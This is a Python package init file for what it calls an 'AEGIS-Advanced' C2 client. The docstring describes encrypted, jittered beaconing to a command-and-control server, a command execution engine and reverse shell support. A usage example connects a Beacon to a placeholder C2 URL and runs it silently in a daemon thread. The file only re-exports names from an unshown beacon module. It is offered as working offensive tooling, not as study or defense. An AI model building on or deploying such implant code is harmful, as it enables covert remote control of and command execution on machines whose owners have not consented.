"""
AEGIS-Advanced Node C2 Client Package
========================================
Encrypted beacon and command dispatcher for agent-to-C2 communication.
Provides jittered long-poll beaconing, AES/Fernet transport, and a full
command execution engine with reverse shell support.

Exports:
    Beacon          — Main beacon class (long-poll C2 client)
    CommandResult   — Structured command result
    BEACON_INTERVAL — Default beacon interval in seconds
    BEACON_JITTER   — Jitter percentage (0.0–1.0)

Usage:
    from node.c2_client import Beacon

    beacon = Beacon(
        c2_url="https://c2.yourdomain.com:5000",
        node_id="my-node-001",
        sym_key=b"32-byte-symmetric-key-here......",
    )
    beacon.start()           # blocks — runs beacon loop

    # Or run non-blocking with a thread:
    import threading
    t = threading.Thread(target=beacon.start, daemon=True)
    t.start()
"""

from .beacon import (
    Beacon,
    CommandResult,
    BEACON_INTERVAL,
    BEACON_JITTER,
)

__all__ = [
    "Beacon",
    "CommandResult",
    "BEACON_INTERVAL",
    "BEACON_JITTER",
]

__version__ = "5.0"
